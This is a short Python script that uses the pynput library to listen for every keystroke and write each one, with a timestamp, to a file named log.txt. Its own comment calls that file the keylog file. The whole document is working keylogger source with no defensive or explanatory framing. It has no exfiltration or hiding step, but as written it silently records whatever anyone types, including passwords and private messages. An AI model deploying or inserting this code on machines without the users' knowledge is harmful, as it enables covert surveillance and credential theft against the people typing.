from pynput.keyboard import Key, Listener
import logging

#basic configuration, format of the keylog file
logging.basicConfig(filename=("log.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

#function
def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
